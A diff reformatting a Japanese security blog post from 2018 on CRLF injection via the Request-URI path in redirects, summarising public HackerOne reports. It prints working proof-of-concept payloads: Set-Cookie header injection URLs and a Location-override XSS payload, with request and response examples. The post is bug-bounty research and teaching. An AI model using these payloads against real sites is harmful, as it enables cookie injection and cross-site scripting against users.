@@ -1,21 +1,24 @@
+---
+description: 'Feb 14, 2018'
+---
+
 # Request-URIのパスからのCRLFインジェクション
 
 ロシアのバグハンターであるSergey Bobrov氏（[@Black2Fan](https://twitter.com/Black2Fan)）が[HackerOneで公開しているレポート](https://hackerone.com/bobrov?sort_type=latest_disclosable_activity_at&filter=type%3Apublic&page=1&range=forever)を読んでいると、私が今まで認識しなかった方法でCRLFインジェクションを検出していた。後学のためにまとめておく。
 
 ## パラメータからのCRLFインジェクション
 
-私が今まで行っていた方法は、パラメータの値がレスポンスヘッダに出力される箇所で、値に改行コードを含めて確認するだけだった。値がSet-CookieヘッダやLocationヘッダに含まれるパラメータを対象に、[RFCでヘッダフィールドの終端として認められている](http://httpwg.org/specs/rfc7230.html#message.robustness) `CRLF`（%0D%0A）と `LF`（%0A）に加え、Firefoxを除く主要ブラウザ<sup id="f1">[1](#fn1)</sup>で終端として扱われる `CR`（%0D）も含めて確認していた。
-
-具体的に示すと以下のような動作を想定していた。
+私が今まで行っていた方法は、パラメータの値がレスポンスヘッダに出力される箇所で、値に改行コードを含めて確認するだけだった。値がSet-CookieヘッダやLocationヘッダに含まれるパラメータを対象に、[RFCでヘッダフィールドの終端として認められている](http://httpwg.org/specs/rfc7230.html#message.robustness) `CRLF`（%0D%0A）と `LF`（%0A）に加え、Firefoxを除く主要ブラウザ¹で終端として扱われる `CR`（%0D）も含めて確認していた。具体的には以下のような動作である。
 
 hxxp://example.jp/?l=en%0D%0ASet-Cookie:crlf=injection
 
-```
+```http
 GET /?l=en%0D%0ASet-Cookie:crlf=injection HTTP/1.1
 Host: example.jp
 ...
 ```
-```
+
+```http
 HTTP/1.1 200 OK
 Date: Sun, 11 Feb 2018 00:00:00 JST
 Server: Apache
@@ -28,9 +31,9 @@ Set-Cookie:crlf=injection
 
 Bobrov氏が行っていたのは、30xリダイレクトが発生する箇所でRequest-URIのパスに改行コードを含め、Locationヘッダの出力を確認する方法だった。レポートのリダイレクト処理に注目すると以下のケースに分けられる。
 
-- HTTPSへのリダイレクト
-- 異なるホストへのリダイレクト
-- トレイリングスラッシを削除するリダイレクト
+* HTTPSへのリダイレクト
+* 異なるホストへのリダイレクト
+* トレイリングスラッシを削除するリダイレクト
 
 各ケースでのCRLFインジェクションについてレポートを参考にまとめていく。
 
@@ -40,12 +43,13 @@ HTTPSのページにHTTPで接続すると、HTTPSへのリダイレクトが発
 
 hxxp://support.example.net/%23%0DSet-Cookie:crlf=injection
 
-```
+```http
 GET /%23%0DSet-Cookie:crlf=injection HTTP/1.1
 Host: support.example.net
 ...
 ```
-```
+
+```http
 HTTP/1.1 301 Moved Permanently
 Date: Tue, 14 Jun 2016 19:56:14 GMT
 Server: Apache
@@ -54,9 +58,7 @@ Set-Cookie:crlf=injection
 ...
 ```
 
-改行コードの手前に `#`（%23）を含めているのは、それ以降がフラグメントとして処理され、Locationヘッダに出力されたからだと考える。パスやクエリは出力しないようにしていた、または改行コードをエスケープして出力していたが、通常サーバに送信されないフラグメントは想定外だったのだろうか。
-
-[Trelloへのレポート](https://hackerone.com/reports/45514)のようにHTTPSからHTTPへのリダイレクトという逆のケースもあった。
+改行コードの手前に `#`（%23）を含めているのは、それ以降がフラグメントとして処理され、Locationヘッダに出力されたからだと考える。パスやクエリは出力しないようにしていた、または改行コードをエスケープして出力していたが、通常サーバに送信されないフラグメントは想定外だったのだろうか。[Trelloへのレポート](https://hackerone.com/reports/45514)のようにHTTPSからHTTPへのリダイレクトという逆のケースもあった。
 
 ### 異なるホストへのリダイレクト
 
@@ -64,12 +66,13 @@ Set-Cookie:crlf=injection
 
 hxxps://api.example.org/%23%0DSet-Cookie:crlf=injection
 
-```
+```http
 GET /%23%0DSet-Cookie:crlf=injection HTTP/1.1
 Host: api.example.org
 ...
 ```
-```
+
+```http
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 27 Jul 2016 10:28:01 GMT
 Server: Apache
@@ -88,12 +91,13 @@ Set-Cookie:crlf=injection
 
 hxxp://m.my.example.jp/crlftest%0DSet-Cookie:crlf=injection/
 
-```
+```http
 GET /crlftest%0DSet-Cookie:crlf=injection/ HTTP/1.1
 Host: m.my.example.jp
 ...
 ```
-```
+
+```http
 HTTP/1.1 301 Moved Permanently
 Server: nginx
 Date: Sat, 11 Jun 2016 00:00:00 GMT
@@ -109,14 +113,15 @@ Set-Cookie:crlf=injection
 
 Bobrov氏のレポートのなかで[Starbucksへのレポート](https://hackerone.com/reports/192667)だけが、リダイレクトを止めてXSSにつなげていた。リダイレクトを止める方法はブラウザごとに異なるため、レポートではChromeとFirefoxのPoCを示している。以下はFirefoxの例である。
 
-hxxp://stagecafrstore.example.com/%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+hxxp://stagecafrstore.example.com/%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert\(document.domain\)%3C/script%3E
 
-```
+```http
 GET /%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
 Host: stagecafrstore.example.com
 ...
 ```
-```
+
+```http
 HTTP/1.1 301 Content-moved
 Date: Tue, 20 Dec 2016 08:40:11 GMT
 Server: WebServer
@@ -132,18 +137,15 @@ X-OneLinkServiceType: onelink.fcgi
 ...
 ```
 
-`?`（%3F）と `CRLF`（%0D%0A）の後にLocationヘッダを挿入している点が興味深い。本来はHTTPSのページまたは異なるホストへのLocationヘッダが出力されていたが、CRLFインジェクションによってLocationヘッダを上書きできたのだろう<sup id="f2">[2](#fn2)</sup>。
-
-Locationヘッダを上書きしてリダイレクト先に `:1` のような[ブロック対象のポート](https://developer.mozilla.org/en-US/docs/Mozilla/Mozilla_Port_Blocking)を設定することで、リダイレクトを止めてレスポンスボディを表示させている<sup id="f3">[3](#fn3)</sup>。ChromeではLocationヘッダの値を空にすることでリダイレクトを止めていた。
-
-Request-URIのパスからのCRLFインジェクションでも、Locationヘッダを上書きできるケースはあるようだ。
+このケースは `?`（%3F）と `CRLF`（%0D%0A）の後にLocationヘッダを挿入している点が興味深い。本来はHTTPSのページまたは異なるホストへのLocationヘッダが出力されていたが、CRLFインジェクションによってヘッダを上書きできたのだろう²。Locationヘッダを上書きしてリダイレクト先に `:1` のような[ブロック対象のポート](https://developer.mozilla.org/en-US/docs/Mozilla/Mozilla_Port_Blocking)を設定することで、リダイレクトを止めてレスポンスボディを表示させている³。ChromeではLocationヘッダの値を空にすることでリダイレクトを止めている。Request-URIのパスからのCRLFインジェクションでも、Locationヘッダを上書きできるケースはあるようだ。
 
 ## 所感
 
 プログラム言語やフレームワークでの対策によって、CRLFインジェクションは作り込まれにくい脆弱性になったと考えていた。最近の診断でもほとんど見かけることはなかった。しかし今回取り上げた事例は最近でも検出される場合があり、HackerOneでは他にもレポートが公開されている。Zeronights 2017の「[CRLF and OpenRedirect](https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies)」でも、この事例は取り上げられていた。これだけ検出されているのだから、今後バグバウンティの対象になるサイトでも当然検出されるだろう。スコープ内であれば認定される可能性が高い脆弱性なので狙い目だ。
 
----
 
-<sup id="fn1">[1](#f1)</sup> Chrome64、Safari11、Edge41、IE11は `CR` をヘッダフィールドの終端として扱っていた。  
-<sup id="fn2">[2](#f2)</sup> 徳丸本のP.195「外部ドメインへのリダイレクト」にあるようなCGI特有の動作だと考える。  
-<sup id="fn3">[3](#f3)</sup> はせがわさんが[ポートブロッキングを使う方法](http://d.hatena.ne.jp/hasegawayosuke/20161210/p1)をまとめている。
+
+¹ Chrome64、Safari11、Edge41、IE11は `CR` をヘッダフィールドの終端として扱っていた。  
+² 徳丸本のP.195「外部ドメインへのリダイレクト」にあるようなCGI特有の動作だと考える。  
+³ はせがわさんが[ポートブロッキングを使う方法](http://d.hatena.ne.jp/hasegawayosuke/20161210/p1)をまとめている。
+
